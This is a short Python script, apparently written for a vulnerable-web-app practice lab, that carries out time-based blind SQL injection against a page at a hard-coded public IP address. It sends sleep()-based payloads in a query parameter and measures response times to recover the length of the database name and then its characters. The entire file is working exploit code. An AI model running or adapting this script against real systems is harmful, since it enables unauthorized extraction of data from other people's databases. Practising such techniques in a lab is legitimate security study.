import urllib
import requests
import time
import threading

def request_url(url):
    proxy = {
        "http": "http://127.0.0.1:10809",
        "https": "http://127.0.0.1:10809",
    }
    start_time = time.time()
    response = requests.get(url, timeout=10, verify=False)
    end_time = time.time()
    if 5 <= end_time - start_time < 7:
        return True
    else:
        return False

# payloads = []
# url = f"http://23.94.218.35:8001/vul/sqli/sqli_blind_t.php?name=kobe{payloads}&submit=%E6%9F%A5%E8%AF%A2"
def get_database_length():
#判断数据库长度  kobe' and sleep(if(length(database())>7,0,9)) #
    i = 1
    while True:
        payload = urllib.parse.quote(f"' and if(length(database())={i},sleep(5),0) #")
        url = f"http://23.94.218.35:8001/vul/sqli/sqli_blind_t.php?name=kobe{payload}&submit=%E6%9F%A5%E8%AF%A2"
        # print(url)
        if request_url(url):
            return i
        i+=1
def get_database_name():
    database_name = []
    db_length = get_database_length()
#获取所有字符串
    for i in range(1,db_length+1):
        for char in "abcdefghijklmnopqrstuvwxyz":
            payload = urllib.parse.quote(f"' and if(substr(database(),{i},1)='{char}',sleep(5),0) #")
            url = f"http://23.94.218.35:8001/vul/sqli/sqli_blind_t.php?name=kobe{payload}&submit=%E6%9F%A5%E8%AF%A2"
            if request_url(url):
                print(char)
                database_name.append(char)
                break
    return ''.join(database_name)




if __name__ == '__main__':
    print(f"ok! database length is [{get_database_length()}]")
    print(f"ok! database name is '{get_database_name()}'")
